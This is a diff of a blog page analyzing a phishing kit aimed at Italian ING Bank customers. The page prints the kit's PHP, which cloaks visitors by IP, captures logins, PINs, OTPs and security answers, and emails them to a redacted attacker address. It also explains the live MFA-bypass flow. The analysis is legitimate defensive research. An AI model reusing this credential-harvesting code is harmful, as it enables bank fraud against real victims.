@@ -1,247 +1,284 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" dir="auto">
 
-    <head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<meta http-equiv="Content-Language" content="en">
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Phishing findings, campaign #3: ING bank | andpalmier</title>
+<meta name="keywords" content="phishing, phishingkit, ingbank">
+<meta name="description" content="Analysis of a phishing kit targeting ING Bank">
+<meta name="author" content="">
+<link rel="canonical" href="https://andpalmier.com/posts/phishing-findings-3/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.3f372934d1c1362b71cc19fea0df71fd2f6c0538b2e002dcd947350384804cad.css" integrity="sha256-PzcpNNHBNitxzBn&#43;oN9x/S9sBTiy4ALc2Uc1A4SATK0=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://andpalmier.com/images/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://andpalmier.com/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://andpalmier.com/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://andpalmier.com/apple-touch-icon.png">
+<link rel="mask-icon" href="https://andpalmier.com/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
 
-	<meta name="author" content="Andrea Palmieri">
-	<meta name="description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning I found this kit while analyzing the phishing sites reported by @illegalfawn. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.">
-	<meta name="keywords" content="blog, infosec, security, cyber security">
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
 
-	<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Phishing findings, campaign #3: ING bank"/>
-<meta name="twitter:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning I found this kit while analyzing the phishing sites reported by @illegalfawn. The zip was left exposed in the page, I believe the malicious actor forgot to remove it."/>
+            .list {
+                background: var(--theme);
+            }
 
-	<meta property="og:title" content="Phishing findings, campaign #3: ING bank" />
-<meta property="og:description" content="I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.
-Let&rsquo;s start from the beginning I found this kit while analyzing the phishing sites reported by @illegalfawn. The zip was left exposed in the page, I believe the malicious actor forgot to remove it." />
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="Phishing findings, campaign #3: ING bank" />
+<meta property="og:description" content="Analysis of a phishing kit targeting ING Bank" />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="/posts/phishing-findings-3/" /><meta property="article:section" content="posts" />
+<meta property="og:url" content="https://andpalmier.com/posts/phishing-findings-3/" /><meta property="og:image" content="https://andpalmier.com/papermod-cover.png"/><meta property="article:section" content="posts" />
 <meta property="article:published_time" content="2021-04-12T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-04-12T00:00:00+00:00" />
 
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://andpalmier.com/papermod-cover.png"/>
+
+<meta name="twitter:title" content="Phishing findings, campaign #3: ING bank"/>
+<meta name="twitter:description" content="Analysis of a phishing kit targeting ING Bank"/>
 
 
-	
-	<base href="/posts/phishing-findings-3/">
-	
-	<title>
-  Phishing findings, campaign #3: ING bank · andpalmier
-</title>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Posts",
+      "item": "https://andpalmier.com/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "Phishing findings, campaign #3: ING bank",
+      "item": "https://andpalmier.com/posts/phishing-findings-3/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Phishing findings, campaign #3: ING bank",
+  "name": "Phishing findings, campaign #3: ING bank",
+  "description": "Analysis of a phishing kit targeting ING Bank",
+  "keywords": [
+    "phishing", "phishingkit", "ingbank"
+  ],
+  "articleBody": " I started hunting and reporting phishing websites on Twitter: follow me here if you are interested! In this series of posts I am going to analyze and discuss some of the phishing kits found online.\nLet’s start from the beginning I found this kit while analyzing the phishing sites reported by @illegalfawn. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.\nThe name of the zip is interesting: POSTEITASLIANE.zip. For non Italians, the name is referring to Poste Italiane, the Italian postal service provider, which also offers financial services and is often target of phishing pages.\nBesides having a typo in the name of the service, the kit - surprisingly - is not targeting Poste Italiane, but ING bank.\nThe phishing page\nExploring the kit This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.\nIf we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:\n$ mdls index.php _kMDItemDisplayNameWithExtensions = \"index.php\" kMDItemContentCreationDate = 2021-03-04 16:16:56 +0000 kMDItemContentCreationDate_Ranking = 2021-03-04 00:00:00 +0000 kMDItemContentModificationDate = 2021-03-04 16:16:56 +0000 kMDItemContentModificationDate_Ranking = 2021-03-04 00:00:00 +0000 kMDItemContentType = \"public.php-script\" index.php The entry point of the kit is index.php:\n\u003c?php session_start(); $ip = $_SERVER['REMOTE_ADDR']; $hash = md5($ip); $url = \"http://www.geoplugin.net/json.gp?ip=$ip\"; function url_get_contents($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0); $data = curl_exec($ch); curl_close($ch); return $data; } $json = url_get_contents($url); $json = json_decode($json, true); $country = $json['geoplugin_countryName']; # if($country == \"Italy\"||$country == \"United Kingdom\" || $country == \"Bulgaria\") { $ban_file = \"logs/banlist.txt\"; $list = file($ban_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); if(in_array($ip, $list)) { header(\"Location: https://www.google.com\"); die(); } else { $_SESSION['auth'] = true; header(\"Location: login.php?\u0026sessionid=$hash\u0026securessl=true\"); die(); } #} # } # else { # header('Location: https://www.google.com'); # } ?\u003e Part of the code is commented out, indicating that the developer was testing different approaches.\nIn the lines above, the kit uses geoplugin.net to detect the country from which the victim is connecting by using the IP address; this technique is quite common for phishing kits. We can see from the comments, that the actor was probably targeting victims from Italy, UK and Bulgaria.\nThe code is then referring to a file called banlist.txt, which should contains a list of IP addresses to be blocked. If the IP of the visitor of the page is in this list, the page will redirect to Google. banlist.txt is not in the zip file, but we can assume it contains a list of IP addresses of known sandboxes, just like it was done for the LinkedIn kit analyzed in a previous post.\nIn case the IP address of the victim is not in banlist.txt, the visitor is redirected to login.php with a new session ID, obtained from the md5 hash of the IP address.\nING Bank kit: login.php\nThe victim, by clicking on the link, is presented the page above, saying that the account of the visitor has been disabled temporarily for security reasons. If we click on the button, the message disappears, and we are now presented with a page asking for our client ID, birth date and phone number (you can see a screenshot of this page at the very beginning of this post).\nInterestingly, the page presents itself with a paragraph, on the left, where it says that “the codes entered will be doubly protected against phishing and spyware”, because after the visitor enters the login details, “it will be shown information which only ING can have”. Of course, this dialog is copied directly from the original ING login page for Italian customers, which you can see below:\nReal ING Bankg login page for Italian customers\nActually, a lot of the code of the page is copied directly from the original ING login page, but - of course - there are some small changes, especially in the forms.\nHere is the form from the original ING page:\n\u003cform name=\"aspnetform\" method=\"post\" action=\"./loginsso.aspx\" onsubmit=\"javascript :return webform_onsubmit();\" id=\"aspnetform\" class=\"vvc_form_enabled\"\u003e while this is the one of the kit:\n\u003cform name=\"aspnetForm\" method=\"post\" action=\"pin.php?\u0026sessionid= \u003c?php echo $hash; ?\u003e \u0026securessl=true\" onsubmit=\"javascript:return WebForm_OnSubmit();\" id=\"aspnetForm\" class=\"vvc_form_enabled\"\u003e The action attribute is different and - again - we see a submission with the parameters sessionid and securessl, with the first still being the hash of the IP address of the visitor. The fields submitted to the form are:\nCustomer code, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txtcc Birth date, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txtgg Phone number, with input name ctl00\\$cphContenuto\\$Login ContainerUC1\\$LoginStepCifUC1\\$txt pin.php Let’s see how they are used in pin.php:\nING Bank kit: pin.php\nThis page is asking for an OTP code that the victim should have received via SMS. This means that the actor is - either manually or with an automated agent - performing the login access to ING Bank with the credentials of the victim while the victim is still on the phishing page: otherwise the OTP code would expire and not useful for signing in. If the mechanics seems a bit confusing, don’t worry, I will make a summary of the details of the process before the conclusion of this post!\nFor now, let’s focus on the code, here is the beginning of the PHP for pin.php:\nif(!isset($_SESSION['auth'])) { header(\"Location: http://www.google.com\"); die(); } $v_ip = $_SERVER['REMOTE_ADDR']; $hash = md5($v_ip); In the code above, the page is - once again - redirecting visitors which do not have the auth parameter to Google, to avoid detection.\nif(!empty($_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc'])) { $codclient=$_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtcc']; $_SESSION['codclient'] = $codclient; } if(!empty($_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg'])) { $giorno = $_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtgg']; } if(!empty($_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm'])) { $mese = $_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtmm']; } if(!empty($_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa'])) { $anno = $_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txtaa']; } This section is taking the parameters sent from login.php and assigning them to variables with Italian names, so far we have assigned data for the customer ID, the day, the month and the year of the specified birth date.\nif(!empty($_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt'])) { $telefono = $_POST['ctl00$cphContenuto$LoginContainerUC1$LoginStepCifUC1$txt']; require \"includes/my_email.php\"; date_default_timezone_set('Europe/London'); $ip = $_SERVER['REMOTE_ADDR']; $time = date(\"m-d-Y g:i:a\"); $agent = $_SERVER['HTTP_USER_AGENT']; $msg = \"+ ------------------------------------------+\\n\"; $msg .= \"+ Dati Login per $username\\n\"; $msg .= \"+ ------------------------------------------+\\n\"; $msg .= \"| codcliente: \".$codclient.\"\\n\"; $msg .= \"| giorno: \".$giorno.\"\\n\"; $msg .= \"| mese: \".$mese.\"\\n\"; $msg .= \"| anno: \".$anno.\"\\n\"; $msg .= \"| telefono: \".$telefono.\"\\n\"; $footer = \"+ ------------------------------------------+\\n\"; $footer .= \"+ Sent from $v_ip on $time via $agent\\n\"; $footer .= \"+ ------------------------------------------+\\n\\n\"; $data = $msg . $footer; $_SESSION['login_info'] = $msg; $fp = fopen(\"*********\", \"a\"); // HIDING LOG FILE fputs($fp,$data); fclose($fp); $subject = \"Poste Login Info for User: $username\"; $headers = \"From: Poste Login Info \u003c$my_email\u003e\\r\\n\"; $headers .= \"Reply-To: Poste Login Info \u003c$my_email\u003e\\r\\n\"; $headers .= \"MIME-Version: 1.0\\r\\n\"; $headers .= \"Content-Type: text/plain; charset=utf-8\\r\\n\"; mail($my_email,$subject,$data,$headers); } After assigning the last bit of information coming from login.php (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from includes/my_email.php and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).\nBelow you can find my_email.php (I have replaced the Gmail address with the asterisks):\n\u003c?php $my_email = \"***********@gmail.com\"; //////// YOUR EMAIL GOES HERE ?\u003e The comment “YOUR EMAIL GOES HERE” may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.\nHere is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:\n+ ------------------------------------------+ + Dati Login per + ------------------------------------------+ | codcliente: 1111111 | giorno: 11 | mese: 01 | anno: 1111 | telefono: 111111111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | pin: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | otp: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ + ------------------------------------------+ + Dati Login per + ------------------------------------------+ | domanda1: 1111111 | domanda2: 1111111 | domanda3: 1111111 + ------------------------------------------+ + Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36 + ------------------------------------------+ We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).\nThe big picture Based on the logs pasted previously, it’s easy to have an idea of how the kit works:\nindex.php -\u003e check if the IP of the visitor is in a blacklist, if that’s the case, redirect the connection to google.com login.php -\u003e convince the victim to enter his/her client ID, phone number and birth date for “security reasons” and send them to the attacker via email. As soon as the criminal receives the stolen credentials, he/she will use them to sign in to the real ING e-banking platform. pin.php -\u003e ask the victim to provide the PIN code for his account and send it via email to the criminal. Now the criminal will use it to continue the signin process to ING bank pretending to be the victim. After that, ING will send an OTP code to the victim’s phone because of the login process initiated by the criminal (which submitted the victim’s phone number). otp.php -\u003e ask the victim to provide the OTP code he should have received from the bank, and send it via email to the criminal. Now the criminal enters the OTP code and (if the code is not expired) he/she should have access to the victim’s account. domande.php (it means questions in Italian) -\u003e ask the victim to provide the answers to the security questions and send them via email to the criminal. This combination of questions/answers could be used as a backup mechanism to authenticate to ING. completa.php -\u003e show a message to the victim says that it will be soon contacted by an operator. In this process, time has a crucial role, because OTP codes are valid only for some seconds (usually 60), thus the criminal either has an automatic agent to perform the login session with ING when the stolen credentials are received, or he/she will have to perform these actions manually and “live”.\nIn addition, at every step, the PHP code will store the credentials obtained in the previous step in log file, e.g. the code in pin.php will write the credentials obtained during the execution of login.php.\nBelow is a schema with the screenshots of the mentioned pages. I didn’t include index.php because it does not have any graphical elements; instead I replaced the first step with a dialog in login.php, which tries to convince the user to enter the security details of his/her account.\nSchema of the phishing kit\nIt’s interesting to note that the kit is performing some basic checks for some input fields (such as the birth date of the victim), but, in one of the final steps, it does not even specify which information should be entered in the form, indeed in domande.php we can only see some asterisks before the input field, which - in addition - accepts only numerical data.\nConclusion In this post, we analyzed a phishing kit targeting Italian customers of ING bank.\nA lot of the code-base of the kit was imported from the original ING page without too much caring. Indeed, while inspecting the network connection, we can see that the kit is trying to reach out to the ING private APIs without receiving an answer (probably because the APIs are checking that the request is coming from an authorized source).\nThe kit tries to access to the Italian ING APIs\nThe code includes a lot of comments and, in general, it seems that is still a work in progress; as a matter of fact, when it was online, it wasn’t able to lure many victims.\nThe ING kit shows how some criminals are trying to bypass Multi-Factor Authentication, by sending credentials (including OTP) via email as soon as these are stolen; and, probably in case they are not able to enter the OTP quick enough, they also try to steal the security questions, which are often used as a fallback mechanism to access the account.\n",
+  "wordCount" : "2099",
+  "inLanguage": "en",
+  "datePublished": "2021-04-12T00:00:00Z",
+  "dateModified": "2021-04-12T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://andpalmier.com/posts/phishing-findings-3/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "andpalmier",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://andpalmier.com/images/favicon-32x32.png"
+    }
+  }
+}
+</script>
+</head>
 
-	
-	<link rel="canonical" href="/posts/phishing-findings-3/">
-	
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
 
-	<link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
-	<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.13.0/css/all.css" integrity="sha384-Bfad6CLCknfcloXFOyFnlgtENryhrpZCe29RTifKEixXQZ38WheV+i/6YWSzkz3V" crossorigin="anonymous">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css" integrity="sha256-l85OmPOjvil/SOvVt3HnSSjzF1TUMyT9eV0c2BzEGzU=" crossorigin="anonymous" />
+</script>
 
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder.min.d5c572a4dda2996f45f4bd9e584d43751439ce2134c33701e8d32920cc8e7d92.css" integrity="sha256-1cVypN2imW9F9L2eWE1DdRQ5ziE0wzcB6NMpIMyOfZI=" crossorigin="anonymous" media="screen" />
-	
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://andpalmier.com" accesskey="h" title="andpalmier (Alt + H)">andpalmier</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://andpalmier.com/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://andpalmier.com/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
 
-	
-
-	
-	
-	
-	
-	<link rel="stylesheet" href="/css/coder-dark.min.58ba09b2c45d36fcfc1a96c8ad83bbbc03a9de4bce8463f3c30a896134febfb3.css" integrity="sha256-WLoJssRdNvz8GpbIrYO7vAOp3kvOhGPzwwqJYTT&#43;v7M=" crossorigin="anonymous" media="screen" />
-	
-	
-
-	
-	<link rel="stylesheet" href="/css/extra-style.css" />
-	
-
-	
-
-	<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
-	<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
-
-	
-
-	<meta name="generator" content="Hugo 0.106.0">
-    </head>
-
+<article class="post-single">
+  <header class="post-header">
     
-    
-    
-    
-    <body class="colorscheme-dark"
+    <h1 class="post-title">
+      Phishing findings, campaign #3: ING bank
+    </h1>
+    <div class="post-meta"><span title='2021-04-12 00:00:00 +0000 UTC'>April 12, 2021</span>&nbsp;·&nbsp;10 min
 
-	  onload=""
-	  >
-	  
-<div class="float-container">
-    <a id="dark-mode-toggle" class="colorscheme-toggle">
-        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
-    </a>
 </div>
-
-
-	  <main class="wrapper">
-	      <nav class="navigation">
-  <section class="container">
-    <a class="navigation-title" href="/">
-      andpalmier
-    </a>
-    
-    <input type="checkbox" id="menu-toggle" />
-    <label class="menu-button float-right" for="menu-toggle"><i class="fas fa-bars"></i></label>
-    <ul class="navigation-list">
-      
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/">Home</a>
-          </li>
-        
-          <li class="navigation-item">
-            <a class="navigation-link" href="/about/">About</a>
-          </li>
-        
-      
-      
-    </ul>
-    
-  </section>
-</nav>
-
-
-	      <div class="content">
-		  
-  <section class="container post">
-    <article>
-      <header>
-        <div class="post-title">
-          <h1 class="title">Phishing findings, campaign #3: ING bank</h1>
-        </div>
-        <div class="post-meta">
-          <div class="date">
-            <span class="posted-on">
-              <i class="fas fa-calendar"></i>
-              <time datetime='2021-04-12T00:00:00Z'>
-                April 12, 2021
-              </time>
-            </span>
-            <span class="reading-time">
-              <i class="fas fa-clock"></i>
-              10-minute read
-            </span>
-          </div>
-          <div class="categories">
-  <i class="fas fa-folder"></i>
-    <a href="/categories/phishing/">phishing</a></div>
-
-          <div class="tags">
-  <i class="fas fa-tag"></i>
-    <a href="/tags/phishing/">phishing</a>
-      <span class="separator">•</span>
-    <a href="/tags/phishingkit/">phishingkit</a>
-      <span class="separator">•</span>
-    <a href="/tags/bank/">bank</a></div>
-
-        </div>
-      </header>
-
-      <div>
-        
-        <figure><img src="/images/posts/phishing-findings/sampei.jpeg"/>
+  </header> 
+  <div class="post-content"><figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/sampei.jpeg#center"
+         alt="Sampei"/> 
 </figure>
 
-<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier">here</a> if you are interested!
+<p>I started hunting and reporting phishing websites on Twitter: follow me <a href="https://twitter.com/andpalmier" target="_blank" rel="noopener">here</a> if you are interested!
 In this series of posts I am going to analyze and discuss some of the phishing kits found online.</p>
-<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning</h2>
-<p>I found this kit while analyzing the phishing sites reported by <a href="https://twitter.com/illegalfawn">@illegalfawn</a>. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.</p>
-<p>The name of the zip is interesting: <code>POSTEITASLIANE.zip</code>. For non Italians, the name is referring to <a href="https://posteitaliane.it">Poste Italiane</a>, the Italian postal service provider, which also offers financial services and is often target of phishing pages.</p>
+<h2 id="lets-start-from-the-beginning">Let&rsquo;s start from the beginning<a hidden class="anchor" aria-hidden="true" href="#lets-start-from-the-beginning">#</a></h2>
+<p>I found this kit while analyzing the phishing sites reported by <a href="https://twitter.com/illegalfawn" target="_blank" rel="noopener">@illegalfawn</a>. The zip was left exposed in the page, I believe the malicious actor forgot to remove it.</p>
+<p>The name of the zip is interesting: <code>POSTEITASLIANE.zip</code>. For non Italians, the name is referring to <a href="https://posteitaliane.it" target="_blank" rel="noopener">Poste Italiane</a>, the Italian postal service provider, which also offers financial services and is often target of phishing pages.</p>
 <p>Besides having a typo in the name of the service, the kit - surprisingly - is not targeting Poste Italiane, but ING bank.</p>
-<figure><img src="/images/posts/phishing-findings/ep3/ing.png"
-         alt="The phishing page"/><figcaption>
+<figure class="align-center ">
+    <img loading="lazy" src="/images/posts/phishing-findings/ep3/ing.png#center"
+         alt="ING bank phishing"/> <figcaption>
             <p>The phishing page</p>
         </figcaption>
 </figure>
 
-<h2 id="exploring-the-kit">Exploring the kit</h2>
+<h2 id="exploring-the-kit">Exploring the kit<a hidden class="anchor" aria-hidden="true" href="#exploring-the-kit">#</a></h2>
 <p>This kit is quite large, as it contains 475 files and 48 directories. Many items are taken directly from the Italian ING webpage, such as images, stylesheet files and JS scripts.</p>
 <p>If we check the metadata of the other files, we can see that they were modified on the 4th of March, indicating that this kit is recent:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ mdls index.php
-</span></span><span style="display:flex;"><span>_kMDItemDisplayNameWithExtensions      <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;index.php&#34;</span>
-</span></span><span style="display:flex;"><span>kMDItemContentCreationDate             <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
-</span></span><span style="display:flex;"><span>kMDItemContentCreationDate_Ranking     <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
-</span></span><span style="display:flex;"><span>kMDItemContentModificationDate         <span style="color:#f92672">=</span> 2021-03-04 16:16:56 +0000
-</span></span><span style="display:flex;"><span>kMDItemContentModificationDate_Ranking <span style="color:#f92672">=</span> 2021-03-04 00:00:00 +0000
-</span></span><span style="display:flex;"><span>kMDItemContentType                     <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;public.php-script&#34;</span>
-</span></span></code></pre></div><h3 id="indexphp">index.php</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ mdls index.php
+</span></span><span class="line"><span class="cl"><span class="nv">_kMDItemDisplayNameWithExtensions</span>      <span class="o">=</span> <span class="s2">&#34;index.php&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">kMDItemContentCreationDate</span>             <span class="o">=</span> 2021-03-04 16:16:56 +0000
+</span></span><span class="line"><span class="cl"><span class="nv">kMDItemContentCreationDate_Ranking</span>     <span class="o">=</span> 2021-03-04 00:00:00 +0000
+</span></span><span class="line"><span class="cl"><span class="nv">kMDItemContentModificationDate</span>         <span class="o">=</span> 2021-03-04 16:16:56 +0000
+</span></span><span class="line"><span class="cl"><span class="nv">kMDItemContentModificationDate_Ranking</span> <span class="o">=</span> 2021-03-04 00:00:00 +0000
+</span></span><span class="line"><span class="cl"><span class="nv">kMDItemContentType</span>                     <span class="o">=</span> <span class="s2">&#34;public.php-script&#34;</span>
+</span></span></code></pre></div><h3 id="indexphp">index.php<a hidden class="anchor" aria-hidden="true" href="#indexphp">#</a></h3>
 <p>The entry point of the kit is <code>index.php</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">session_start</span>();
-</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#39;REMOTE_ADDR&#39;</span>];
-</span></span><span style="display:flex;"><span>$hash <span style="color:#f92672">=</span> <span style="color:#a6e22e">md5</span>($ip);
-</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://www.geoplugin.net/json.gp?ip=</span><span style="color:#e6db74">$ip</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">url_get_contents</span>($url) {
-</span></span><span style="display:flex;"><span>    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>($url);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_FOLLOWLOCATION</span>, <span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYPEER</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_SSL_VERIFYHOST</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>    $data <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_exec</span>($ch);
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_close</span>($ch);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> $data;
-</span></span><span style="display:flex;"><span>}
